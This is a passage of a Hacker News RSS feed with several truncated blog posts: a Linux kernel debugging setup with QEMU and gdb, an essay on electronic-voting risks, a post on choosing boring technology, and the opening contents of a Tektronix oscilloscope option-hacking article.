pricing costs you can use <a href="https://azure.microsoft.com/en-us/pricing/calculator/">this pricing calculator</a>.</p><p>P.s. don’t forget to delete/clean/stop all resources.</p><p><a href="https://disqus.com/">comments powered by </a></p></div></div></section></div>]]>
            </description>
            <link>http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057328</guid>
            <pubDate>Wed, 11 Nov 2020 10:57:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging the Kernel with QEMU]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057309">thread link</a>) | @__rompy
<br/>
November 11, 2020 | https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html | <a href="https://web.archive.org/web/*/https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4480419177723293408">
<p>Hi folks, in this post I'm going to walk through how to setup the linux kernel for debugging. I will also demonstrate that the setup works by setting a break-point to a test driver I wrote myself. All the code will be available from my gitlab, all the links to my gitlab will be re-posted at the end.&nbsp;</p><p>The setup I describe here re-uses some parts of the syzkaller setup, and for good reason later on in the post series I will break into a tutorial for the syzkaller tool as well. So lets get on with it.</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-u2vPJD5mvfQ/X6v9Jig2QOI/AAAAAAAAQFA/AeLKhrX1BXM8HY7pN694qJFyvWDilFojACLcBGAsYHQ/s1109/Screenshot%2Bfrom%2B2020-11-11%2B17-00-44.png" imageanchor="1"><img data-original-height="625" data-original-width="1109" height="360" src="https://1.bp.blogspot.com/-u2vPJD5mvfQ/X6v9Jig2QOI/AAAAAAAAQFA/AeLKhrX1BXM8HY7pN694qJFyvWDilFojACLcBGAsYHQ/w640-h360/Screenshot%2Bfrom%2B2020-11-11%2B17-00-44.png" width="640"></a></td></tr><tr><td>Screenshot of a successful debug session with full debug symbols for the kernel! We can even see the call to start_kernel and a frame before that as well!<br></td></tr></tbody></table><br>&nbsp;<h2>The Process</h2><p>Okay so we want to study kernel exploitation but given that the kernel isn't something totally accessible in userspace, its not as convenient to debug as userpace stuff, we need a bit of a run up before we can actually poke and prod the kernel to figure out how to write our exploits. So there's a number of important steps to how we get this done, here's what we're going to do:</p><ol><li>Build a kernel</li><li>Build an image</li><li>Launch the virtual machine&nbsp;</li><li>Attach and setup the debugger</li><li>Building, loading and debugging a test module <br></li></ol><p>We also need to be able to build our kernel because there may be build options that are important to configure in order to control exploit protection or include modules and functionality to the kernel when needed. <br></p><h2>Building a Kernel</h2><p>Okay so before we get going with launching our Qemu instances and debugging modules we need an environment. For convenience sake I'm working off of a fresh Ubuntu 18.04.5 LTS machine. I'll document the processes from fresh install to first successful kernel build.</p><p>To start we need to make sure we have everything we need to build a kernel:</p><p><span>$<b>sudo apt-get update</b></span></p><p><span>$<b>sudo apt-get upgrade </b><br></span></p><p><span>$<b>sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison qemu-system-x86</b></span></p><p>Next we obviously need a kernel so lets download a brand new kernel:</p><p><span>$<b>wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.9.7.tar.xz</b><br>--2020-11-10 23:00:26--&nbsp; https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.9.7.tar.xz<br>Resolving cdn.kernel.org (cdn.kernel.org)... 151.101.225.176, 2a04:4e42:35::432<br>Connecting to cdn.kernel.org (cdn.kernel.org)|151.101.225.176|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 115538096 (110M) [application/x-xz]<br>Saving to: ‘linux-5.9.7.tar.xz’<p>linux-5.9.7.tar.xz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 42%[=============&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]&nbsp; 46.79M&nbsp; 3.08MB/s&nbsp;&nbsp;&nbsp; eta 23s&nbsp;&nbsp; &nbsp;</p></span></p><p><span>... <br></span></p><p><span>$<b>tar -xf linux-5.9.7.tar.xz</b></span></p><p>We're just a couple steps from sending the final build commands, before we get to that lets make sure the kernel config is ready to rock. Because we're working on a Linux host we can simply swipe the .config for the virtual machine's Ubuntu kernel like so:</p><p><span>$<b>cp /boot/config-5.4.0-52-generic .config</b></span></p><p>We then need to select some options that make debugging and exploit dev a little easier. First thing we need is to merge some options for making the kernel easier to run in a virtual machine:</p><p><span>$<b>make kvmconfig</b></span></p><p><span>Using .config as base<br>Merging ./kernel/configs/kvm_guest.config<br>#<br># merged configuration written to .config (needs make)<br>#</span></p><p><span>...</span></p><p>Great, now we need to enable some options for debug symbols, kaslr and other awesome things. So open the <span>.config</span> somewhere in a text editor and make sure you either add or modify the file so these options are set:</p><p><span>CONFIG_KCOV=y<br>CONFIG_DEBUG_INFO=y<br>CONFIG_KASAN=y<br>CONFIG_KASAN_INLINE=y<br>CONFIG_CONFIGFS_FS=y<br>CONFIG_SECURITYFS=y </span><br><span><span># CONFIG_RANDOMIZE_BASE is not set<br></span></span></p><p>Cool now we need to make sure the config is ready to go for a build:</p><p><span>$<b>make savedefconfig</b></span></p><p><span>$<b>make -j4</b></span></p><p><span>&nbsp;...</span></p><p>Now you should grab some coffee, play a startcraft2 game because this may take a while. Okay so if your build worked you should have an object file in the following location:</p><p><span>[kernel_dir]/arch/x86_64/boot/bzImage</span>&nbsp;</p><h2>Build an image</h2><p>We're going to build an image for this kernel so we might as well plop a "image" directory in this folder:</p><p><span>$<b>mkdir [kernel_dir]/image/</b></span></p><p>Once you're kernel is build we need to start thinking about how to build a file system for this. Here I'm going to cheat and steal some tips from the syzkaller folks. We need to first download syzkaller, as follows:</p><p><span>$<b>git clone https://github.com/google/syzkaller.git</b></span></p><p><span>Cloning into 'syzkaller'...<br>remote: Enumerating objects: 1, done.<br>remote: Counting objects: 100% (1/1), done.<br>...<br></span></p><p>Move back to the kernel build and setup an image:</p><p><span>$<b>cd [kernel_dir]/image/</b></span></p><p><span>$<b>cp [syzkaller_dir]/tools/create_image.sh .</b></span></p><p>Okay so we can now create an image, all we need to do is simply invoke create_image.sh:</p><p><span>$<b>./create_image.sh&nbsp;</b></span></p><p><span>+ DIR=chroot<br>+ PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,python,xrdp,g++,make,libtool,autoconf,nasm<br>+ '[' -z ']'<br>+ ADD_PACKAGE=make,sysbench,git,vim,tmux,usbutils,tcpdump</span></p><p><span>...</span><br></p><p>If that worked you should have the following in your folder:</p><p><span>$<b>ls</b>&nbsp;</span></p><p><span>chroot/</span></p><p><span>create-image.sh</span></p><p><span>stretch.id_rsa</span></p><p><span>stretch.id_rsa.pub</span></p><p><span>stretch.img</span><br></p><h2>Launch the virtual machine <br></h2><p>Now we can launch qemu with all the goodies in place:</p><p><span>qemu-system-x86_64 \<br>&nbsp; -kernel <b>../arch/boot/x86_64/bzImage</b> \<br>&nbsp; -append "console=ttyS0 root=/dev/sda earlyprintk=serial nokaslr"\<br>&nbsp; -hda <b>./stretch.img</b> \<br>&nbsp; -net user,hostfwd=tcp::10021-:22 -net nic \<br>&nbsp; -enable-kvm \<br>&nbsp; -nographic \<br>&nbsp; -m 2G \<br>&nbsp; -s \<br>&nbsp; -S \<br>&nbsp; -smp 2 \<br>&nbsp; -pidfile vm.pid \<br>&nbsp; 2&gt;&amp;1 | tee vm.log</span></p><p><span>...</span></p><p><br>The <span>-s</span> is a shorthand for <span>-gdb tcp::1234</span>, which means the gdbserver will be hosted at port 1234. -S tells qemu not to start the cpu automatically, this gives us a chance to set a breakpoint before the kernel starts executing. </p><p>So that's the image running smoothly, lets setup our debugging environment.</p><h2>Attach and setup the debugger<br></h2><p>We can then attach a gdb debugger to the qemu instance as follows. On another terminal, separate from the one running your qemu instance, start up gdb and issue the following commands:</p><p><span>$<b>cd [kernel_dir]/image/ </b><br></span></p><p><span>$<b>gdb ../vmlinux<br></b></span></p><p><span>Reading symbols from ../vmlinux...</span></p><p><span>(gdb)<b> target remote :1234<br></b></span></p><p><span>Remote debugging using :1234<br>0x000000000000fff0 in exception_stacks ()<br></span></p><p><span>(gdb) <b>c</b></span></p><p>We give the "c" command to continue execution. We can now set some of our own breakpoints. As part of the tutorial I've included a custom IOCTL driver and app code (code that invokes the ioctl from userspace), i thought this would be nifty since it shows full ability to develope and debug a driver, something crucial to hunting down modern bugs and exploit development. Anyway lets code and build our own module.</p><h2>Building, Loading and debugging a test module<br></h2><p>Okay so we need to make a test ioctl driver, so lets head over the to kernel source directory and make a new folder in the /driver/ subfolder:</p><p><span>$</span><b><span>cd&nbsp; [kernel_dir]/drivers/</span></b></p><p><span>$</span><b><span>mkdir debug_driver/</span></b></p><p><span>$</span><b><span>cd debug_driver/ <br></span></b></p><p><span>$</span><b><span>touch debug_driver.c</span></b></p><p><span>$</span><b><span>touch debug_driver_app.c</span></b></p><p><span>$</span><b><span>touch Makefile</span></b></p><p>The code for <span>debug_driver.c</span> and <span>debug_driver_app.c </span>as we well as the <span>Makefile</span> are available at this repo <a href="https://gitlab.com/k3170makan/linux-kernel-exploit-development">https://gitlab.com/k3170makan/linux-kernel-exploit-development</a>. All you need to do is download the repo and stick this in its own folder under <span>[kernel_dir]/drivers/</span>. To build the module the we need to set the "M" variable in the kernel make script:</p><p><span>$<b>cd [kernel_dir]; make -C . M=drivers/debug_driver/</b></span></p><p><span>make: Entering directory '/home/kh3m/Research/Kernel/debug_image/linux-5.5.3'<br>&nbsp; AR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drivers/debug_driver//built-in.a<br>&nbsp; CC [M]&nbsp; drivers/debug_driver//debug_driver.o</span></p><p><span>...</span></p><p>Now we need to get this module on our qemu host somehow, I do this the hard way, I'm sure there's all sorts of nifty ways to scp files onto the qemu host but I actually just re-create the image after copying the drivers to a folder to be baked into the start up filesystem. First we need to edit create-image.sh so it includes everything in a folder we specify, that way we can just dump stuff in the folder and run create-image.sh whenever we want those files on a live instance.</p><p>So before create-image.sh builds the disk image on line 129, stick this in there:</p><p>++ <span>sudo cp -r ./add/* $DIR/home/.</span><br></p><p>now we make a "add" folder and stick the kernel module and app code in there:</p><p><span>$<b> cd [kernel_dir]/image/</b></span></p><p><span>$ <b>mkdir add/</b></span></p><p><span>$ <b>cd add/</b></span></p><p><span>$ <b>cp ../../drivers/debug_driver/debug_driver.ko .</b><br></span></p><p><span>$ <b>cp ../../drivers/debug_driver/debug_driver_app.c .</b></span></p><p><span>$ <b>./create-image.sh</b> </span></p><p>Okay so we have a module, we have a symbol file debug_driver.ko, with stuff we need to set breakpoints. Lets load the module into the kernel, then check where it gets loaded before we actually set the breakpoint:</p><p><span>root@syzkaller:$ <b>cd /home/</b></span></p><p><span>root@syzkaller:$ insmod debug_driver.ko</span></p><p><span> [&nbsp;&nbsp; 32.792570] audit: type=1400 audit(1605058227.605:7): avc:&nbsp; denied&nbsp; { module_load } for&nbsp; pid=249 comm="insmod" path="/home/debug_driver.ko" dev="sda" ino=21253 scontext=system_u:system_r:kernel_t:s0 1<br>[&nbsp;&nbsp; 32.793766] debug_driver: loading out-of-tree module taints kernel.<br>[&nbsp;&nbsp; 32.800394] [debug_driver] loaded! <br>[&nbsp;&nbsp; 32.800826] [debug_driver] device registered successfully<br>[&nbsp;&nbsp; 32.802298] [debug_driver] device has been successfully created <b><br></b></span></p><p>Before we can debug it properly we need to know where it is loaded in kernel memory:</p><p><span>root@syzkaller:/home# <b>cat /proc/modules</b> <br>debug_driver 16384 0 - Live <b>0xffffffffa0000000</b> (O)</span></p><p>Okay lets now set our breakpoint and load the symbol file using the base address of the module:</p><div><p><span>&nbsp;(gdb) <b>add-symbol-file ../drivers/debug_driver/debug_driver.ko&nbsp; 0xffffffffa0000000</b><br>add symbol table from file "../drivers/debug_driver/debug_driver.ko" at<br>&nbsp;&nbsp; &nbsp;.text_addr = 0xffffffffa0000000<br>(y or n) <b>y</b><br>Reading symbols from ../drivers/debug_driver/debug_driver.ko...<br>(gdb) <b>break dev_read</b><br>Breakpoint 1 at <b>0xffffffffa0000010: file drivers/debug_driver//debug_driver.c</b>, line 81.<br>(gdb) c</span></p></div><p>Cool lets execute the driver program so we can trigger the code we want:</p><p><span>root@syzkaller:$ <b>gcc -o debug_driver_app.elf debug_driver_app.c<br></b></span></p><p><span><span>root@syzkaller:/home# <b>./debug_driver_app.elf </b><br>Usage: ./debug_driver_app.elf [message to write] [read length] <br></span></span></p><p><span><span>root@syzkaller:</span>$ <b>./debug_driver_app.elf "hello" 10</b></span></p><p><span>[&nbsp; 160.083320] [debug_driver] message successfully copied message =&gt; [hello]<br>[&nbsp; 160.083326] [debug_driver] buffer copied to message holder<br>[debug_driv…</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html">https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html</a></em></p>]]>
            </description>
            <link>https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057309</guid>
            <pubDate>Wed, 11 Nov 2020 10:53:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why electronic voting is dangerous]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057302">thread link</a>) | @ian_starts
<br/>
November 11, 2020 | https://blog.iankok.com/risk-electronic-voting | <a href="https://web.archive.org/web/*/https://blog.iankok.com/risk-electronic-voting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>With the 2020 US elections having mail in ballots,
I found myself wondering if a digital solution would be safer, more reliable and easier. As usual the answer isn't straightforward. </p>
<p>In this post I'll talk you through some possible solutions and their potential downsides.</p>
<p>I will mostly focus on Dutch elections, seeing as I can provide the best insights, and most arguments are easily
transferable to other nations.</p>
<h2>Requirements</h2>
<p>If we would develop a voting system from scratch it would need to have some features that protect our rights and make
sure the elected ruler is the one the people really wanted (questionable if that's the case with current electoral systems, but that's for another time).</p>
<ol>
<li><strong>Accuracy</strong> - are all the votes counted, do they represent the will o' the people?</li>
<li><strong>Anonymity</strong> - very difficult this one. We don't want the votes to be signed, that would leave opportunities for
coercion and intimidation. However, we do need to verify that the voter is eligible to vote (or a real person at all for that matter).</li>
<li><strong>Verifiability</strong> - we need to be able to verify if the process went correctly.</li>
<li><strong>Speed</strong> - it would be useful if votes would be counted quicker. </li>
</ol>
<p>A big problem with anonymity and verifiability is that making votes anonymous makes them difficult to verify.</p>
<p>If we had a database with all the people who voted, and their cast vote, verifiability would be tackled. However, it wouldn't be anonymous.</p>
<h2>e-voting vs i-voting</h2>
<p>When discussing electronic voting there are essentially two things at play. </p>
<ol>
<li><strong>e-voting</strong> - voting on a machine on location. Like 35 municipalities did in the Netherlands between roughly 1970 and 2007.</li>
<li><strong>i-voting</strong> - voting online using a device connected to the internet.</li>
</ol>
<p>e-voting is usually seen as the easier one. You can tackle anonymity by submitting anonymous votes, and verify it
manually with a passport check before entering the voting booth.</p>
<p>i-voting is much more difficult, because you can't have the manual check.</p>
<h2>We can protect our back accounts, so how hard can protecting votes be, right?</h2>
<p>Well, unless you're part of a secret society with unlimited wealth, chances are your bank account is not a very interesting target.</p>
<p>The scale of an election is massive. The decision made there has so much influence,
that it's an incredibly high value target.</p>
<blockquote>
<p>Most hackers aren't hardcore geeks typing away on their kali linux distro. It's usually a game of
influencing people, leaked data or a weak password. This can be summarised as the <em>human error</em>.</p>
</blockquote>
<p>It's much more likely hackers will pour resources into hacking an election than a bank account.</p>
<h2>e-voting</h2>
<p>e-voting seems like a pretty good idea. it's pretty straight forward on an abstract level: keep everything the same, only make the counting digital.</p>
<p>Too bad it's an oversimplification. It's impossible for most voters to check how the system works internally.
Even if the voters were all programmers, the source code doesn't have to be open-source. There's no rule against making the source code private. </p>
<p>So basically, it's a black box which we have to trust with one of the most important things in a democracy, and impossible for any voter to check the process.</p>
<p>This fear is backed by a <a href="https://www.bundesverfassungsgericht.de/SharedDocs/Pressemitteilungen/EN/2009/bvg09-019.html">2009 decision</a> by the Federal Constitutional Court of Germany:</p>
<blockquote>
<p>The use of voting machines which electronically record the voters’ votes and electronically ascertain the election
result only meets the constitutional requirements if the essential steps of the voting and of the ascertainment of the
result can be examined reliably and without any specialist knowledge of the subject.  </p>
</blockquote>
<p>Beside these 'lack of control' fears, a lot of systems have failed miserably over the years.</p>
<p>The lack of pen-testing (inviting good-guy hackers to attack your system and check for vulnerabilities) makes it very hard to pinpoint exact failures, but here's a curated list of found problems in the US:</p>
<ul>
<li>2003 – In Fairfax, new voting machines either didn’t work, or would lose the voter’s choice after a few moments.</li>
<li>2003 – The State of Maryland found that the Diebold Election Systems, Inc. (now rebranded as Premier Election Solutions) AccuVote-TS system “as implemented in policy, procedure, and technology, is at high risk of compromise.”</li>
<li>2002-2006 – During this period, Election Systems and Software, the US’s leading voting machine manufacture was shipping some of its systems with remote access software, making them vulnerable to hacking.  </li>
<li>2006 – Researchers from the Voting Systems Technology Assessment Advisory Board (VSTAAB) and the University of California corroborated previous research that found various Diebold voting machines can have the votes on their memory cards tampered with in a way that cannot be detected. They found a number of other security vulnerabilities as well.</li>
<li>2006 – Princeton researchers studied the Diebold AccuVote-TS and found that it was vulnerable to a range of serious attacks. These included the possibility of malware installation which could be used to alter the vote.</li>
<li>2015 – The Virginia Information Technologies Agency assessed the WinVote machine, which is manufactured by Advanced Voting Solutions. The agency recommended discontinuing the use of these machines after they found a range of serious flaws such as weak passwords, outdated security protocols, and insufficient system hardening.</li>
<li>2018 – At DEFCON, J. Alex Halderman showed that Diebold AccuVote TSX voting machines could be manipulated remotely in a mock election. The same vulnerable machines were being used in 18 different states. After the event, a 50 page report was released, detailing vulnerabilities in Election Systems &amp; Software’s M650 machine and the Diebold AccuVote TSX. Together, these machines are used in as many as 23 states.</li>
<li>2018 – Some voters in Texas allege that the Hart InterCivic’s eSlate machine was switching their vote to another candidate in the state’s election for senator.</li>
</ul>
<p>And of course a Dutch problem:</p>
<ul>
<li>2007 - It was possible to read and analyse the Electromagnetic radiation of voting machines from dozens of meters away. This caused the anonymity to be completely compromised.</li>
</ul>
<p>Side-note; this was known before an election took place. Still, parts of the election were held with the voting machines,
causing the Dutch government to be sued, losing, and going back to paper ballots.</p>
<p>So yeah, e-voting; not perfect.</p>
<h2>Hopes for e-voting</h2>
<p>More recently there has been talk of re-instating e-voting with some big adaptations. </p>
<p>The new version would basically be a computer with a printer. You can cast your vote in a voting booth with no
connectivity to the web. The voting machine would print your vote on a piece of paper, which you can then check for errors and deposit in the voting box.
These printed votes are easily read by a central computer, making counting them a lot easier and quicker.</p>
<p>Though this seems like an interesting concept, it's also doesn't have a lot of benefits over paper ballots. As the software axiom goes "keep it simple, stupid",
this doesn't really comply.</p>
<h2>i-voting</h2>
<p>I-voting, also known as remote e-voting, is casting your vote from the comfort of your own couch.
The only country which implemented such a system is Estonia. With tech giants migrating more of your life to the internet,
it seems that it's only logical to move to i-voting. Let's take a look at Estonia. How their system works,
what the vulnerabilities are, and whether we should follow suit.</p>
<h3>How it works</h3>
<p>Estonia's i-voting system builds on their ID card. This ID card is also a smart card and allows owners to digitally
sign documents and facilitates secure authentication. This already laid infrastructure makes it possible to tackle one of our demands; <strong>verifiability</strong>.</p>
<p>The i-voting system is available in an early voting period (sixth day to fourth day prior to Election Day). You can
change your vote an unlimited amount of times in that timeframe. You can also overwrite your vote by going to a
polling station, invalidating your i-vote.</p>
<p>When this new voting method was first introduced, the president Arnold Rüütel challenged i-voting, claiming breach of the principle of equality of voting.
The president brought a petition against the e-voting provisions to Estonian Supreme Court but lost. Rüütel was mostly
popular amongst the still Russian speaking elderly minority. About 1.9% voted online in the
<a href="https://archive.is/20120713045721/http://news.com.com/Estonia+pulls+off+nationwide+Net+voting/2100-1028_3-5898115.html">2005 election</a>.
This has increased over the years to <a href="https://rk2019.valimised.ee/en/voting-result/voting-result-main.html">43.8% in 2019</a>.</p>
<p>Estonia also open-sourced much of their source code to make the system as transparent as possible. They haven't
released everything (annoying some critics). Most notably, all the client side code is missing (more in that later).</p>
<p>One of the biggest things going for i-voting is potentially increasing voter turnout, however that
claim has been <a href="https://core.ac.uk/download/pdf/95665595.pdf">mostly invalidated.</a></p>
<h3>Vulnerabilities</h3>
<p>One peer <a href="https://estoniaevoting.org/findings/paper/">reviewed research paper</a> claims the researchers could be able to
breach the system, change votes and vote totals, and erase any evidence of their actions if they could install
malware on the election servers. Now of course, it's basically impossible to breach the security of election servers.
However, circling back to human error; what if someone is bribed, careless, or just malicious? The stakes are immense,
and these edge cases can not be ignored.</p>
<p>Another gaping security hole is the personal device of the voter. This may be the weakest link in the chain.
The system is quite robust after the ballot has been cast. However, sending that ballot is not trivial. </p>
<p>It's easy to write a fake web client (hence the hidden source code. That would make it too easy),
tricking people into thinking they've already voted. Or a piece of malware, sending a different vote than you typed.</p>
<p>The Estonian National Electoral parried these criticisms, <a href="http://vvk.ee/valimiste-korraldamine/vvk-uudised/vabariigi-valimiskomisjoni-vastulause-the-guardianis-ilmunud-artiklile">claiming</a>
they "give us no reason to suspend online balloting". The purported vulnerabilities were said to be either not feasible in reality or already accounted for in the design of the e-voting system.</p>
<p>The Estonian Information System Authority also responded. Claiming the criticisms as a political, rather …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.iankok.com/risk-electronic-voting">https://blog.iankok.com/risk-electronic-voting</a></em></p>]]>
            </description>
            <link>https://blog.iankok.com/risk-electronic-voting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057302</guid>
            <pubDate>Wed, 11 Nov 2020 10:52:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Choosing Boring Tech]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057240">thread link</a>) | @amzans
<br/>
November 11, 2020 | https://panelbear.com/blog/boring-tech/ | <a href="https://web.archive.org/web/*/https://panelbear.com/blog/boring-tech/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Over the years I have observed that many engineers tend to attribute much of the success or failure of a company to the technical choices made. I know I’m often guilty of this too. And while it is often justified, I would argue that for the vast majority of startups out there, the choice of programming language, framework, or even database doesn’t matter that much. This seems especially true during the early stages.</p><h2>Through the engineering lens</h2><p>This perception is understandable, we as engineers tend to look at the world from a specific lens, and are often biased by what we know best. Our daily activities may include things such as debugging CI pipelines, implementing new features, pairing with colleagues, or migrating the always present legacy codebase. The environment that surrounds us makes it easy to believe that it all boils down to those things that we see and understand. It’s an illusion that makes us feel like we’re fully in control of what makes or breaks the product.</p><p>Don’t get me wrong, it can be a huge advantage for many companies to make their product 3x more efficient than competitors, or to have elegant, composable code. But you might be focusing on the wrong problems if nobody cares about the product you’re actually building, and sooner or later your business will hit this wall.</p><p>I’m not saying that software doesn’t matter. A solid foundation for your startup goes a long way. If investing in this allows you to build better features faster than your competitors, more power to you. But finding the right balance is highly dependent on what you’re trying to solve and the resources you have at hand. There’s no right or wrong way to do it, and as usual, it mainly comes down to tradeoffs.</p><p><img src="https://panelbear.com/static/img/blog/lenses.png" alt="Different lenses"></p><h2>Boring makes me happy</h2><p>I believe aiming for a healthy balance of risk vs reward when it comes to your technical choices is something to strive for. In particular, if it decreases the chances you get stuck on the wrong problems down the road.</p><p>This is why I have come to appreciate ideas such as <a href="https://mcfunley.com/choose-boring-technology">Choose Boring Technology</a>. This is often interpreted as “picking old technologies over newer ones”, but it doesn’t necessarily mean that. For me, this comes down to using proven technologies in which the ways it can fail are mostly known, but occasionally experimenting with different, possibly newer tools that might suit me better.</p><p>Maybe you want to gain more experience by using the latest framework or programming language, or you just want to have some fun. You do what makes you happy. But if you’re trying to make a decision to increase the odds that your product or business will succeed, it’s worth stepping back and considering your options.</p><p>For me, mainly choosing software that has been around for longer is not about it being boring or older, it’s about the fact that the ways in which it fails are better known. There are fewer unknowns for you to deal with and this maximizes your chances of actually shipping the project.</p><p>For example the other day I had an issue with my Django app, and a quick search led me to tens of answers to this problem in various forums and websites. It took me at most 10 minutes to get back on track and that was the end of this issue.</p><p>I experienced the exact opposite a few years ago with a popular, but not so battle-tested Scala library my team had been using for a while. We were probably among the first to encounter the issues we were facing, and it seemed nobody had walked down this path before. Maybe it sounds like a fun challenge or a great chance to contribute back to OSS (which I’m happy to), but once you solve it, do your customers really care about it? How many days, weeks, or even months are you willing to invest in such issues? In my case, I’d rather use that time to ship new features or improve the existing ones.</p><h2>Proven tech vs new tools</h2><p>I try to follow an 80/20 distribution when it comes to my choice of tools. This means my stack consists of about 80% software I already know well, but I do allow myself 20% of the stack to explore tech I have less experience with. The exact ratio is not what’s important here, it’s more the fact that you should lean towards using proven technologies.</p><p>This also resonates with how <a href="https://en.wikipedia.org/wiki/Multi-armed_bandit">Multi-armed bandits</a> work. You try to maximize your expected gain by taking advantage of what worked well in the past, while sometimes exploring new things to avoid missing out on a possible goldmine.</p><p><img src="https://panelbear.com/static/img/blog/bandits.png" alt="Balance new vs proven"></p><p>A more recent example of mine is <a href="https://panelbear.com/">Panelbear</a>, it started as an embarrassingly simple Django app with no charts, all metrics were rendered on a plain HTML table, and all data was stored on a SQLite database. Took literally a weekend to get it up and running including manually deploying to a $5/mo VM. Low risk and high reward for my needs at the time.</p><p>Fast forward and as I added more features and began handling more page views for various websites, I started to notice that the codebase could use some refactoring. It also became increasingly repetitive to do things like deploying to new instances, issuing SSL certs, and keeping the DNS records up to date in case the IP address of my instances changed.</p><p>As a second iteration, I upgraded to a docker-compose setup plus lots of glue code. But soon enough I found myself reinventing what other tools already do well. There are multiple ways to solve each of these pain points, but in my case, it came down to using a tool I am very familiar with from my full-time job: Kubernetes.</p><p>Yes, I am well aware Kubernetes is an absolute overkill for a lot of projects out there, and I could have gotten away with a more traditional solution. But it allowed me to simplify the operational aspects tremendously, and I feel comfortable working with it after having the pleasure of putting down multiple production fires for my employer over the years. That’s why I wouldn’t bindly recommend it to everyone. Do what you know best.
As an added benefit, it also made it trivial when I migrated from DigitalOcean to Linode, and most recently to AWS (each migration took mostly an evening of changing my Terraform files and deploying them - I’m being serious). But that’s for another post.</p><p>Another case in which it paid off once again, was when I wanted to experiment with using Clickhouse for data ingestion and the aggregation queries. It took me less than 10 minutes to write a basic deployment manifest and have it up and running. This included automated SSL certs, in-cluster service discovery, and unified logging/monitoring out of the box. It was a huge win since it allowed me to try things out faster than before.</p><p>Even better, I can deploy any container and operate it the exact same way as I deploy anything else on my cluster. Need more volume storage with zero downtime? It’s a simple manifest change, commit and deploy. Same thing when I needed Redis for caching, I was up and running in minutes, without increasing my costs or adding operational complexity.</p><h2>Focus on shipping</h2><p>My point is, I moved into these technologies as the pain with the previous solution was higher than dealing with the new tech. But more importantly, it helped me ship features even faster to my customers while reducing the operational overhead for me.</p><p>If I had started with the more advanced setup from day one, I might have lost all motivation before I would have had the first version of Panelbear. The key is to solve the problems that are getting between you and your goals, not potential issues you believe one day will be yours.</p><p>Hope you enjoyed this blog post. I plan on writing more about Panelbear’s tech stack, and lessons learned along the way. So stay tuned!</p></div></div></div>]]>
            </description>
            <link>https://panelbear.com/blog/boring-tech/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057240</guid>
            <pubDate>Wed, 11 Nov 2020 10:37:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Option Hacking the Tektronix TDS 420A]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25057162">thread link</a>) | @segfaultbuserr
<br/>
November 11, 2020 | https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html | <a href="https://web.archive.org/web/*/https://tomverbeure.github.io/2020/07/11/Option-Hacking-the-Tektronix-TDS-420A.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Previous installments in this series: <a href="https://tomverbeure.github.io/2020/06/27/In-the-Lab-Tektronix-TDS420A.html">In the Lab - Tektronix TDS 420A Oscilloscope</a>, 
 <a href="https://tomverbeure.github.io/2020/06/27/Tektronix-TDS420A-Remote-Control-over-GPIB.html">Tektronix TDS 420A Remote Control over GPIB</a>, 
 <a href="https://tomverbeure.github.io/2020/07/02/Extracting-the-Tektronix-TDS420A-Firmware.html">Extracting the Tektronix TDS 420A Firmware</a>, 
 <a href="https://tomverbeure.github.io/2020/07/03/TDS420A-Serial-Debug-Console-Symbol-Table-Ghidra.html">A Tektronix TDS 420A, a Serial Debug Console, a Symbol Table, and Ghidra</a></em></p>

<ul id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a></li>
  <li><a href="#how-a-tds400-oscilloscope-manages-hardware-features" id="markdown-toc-how-a-tds400-oscilloscope-manages-hardware-features">How a TDS400 Oscilloscope Manages Hardware Features</a></li>
  <li><a href="#the-key-to-enabling-option-05---video-triggering" id="markdown-toc-the-key-to-enabling-option-05---video-triggering">The Key to Enabling Option 05 - Video Triggering</a></li>
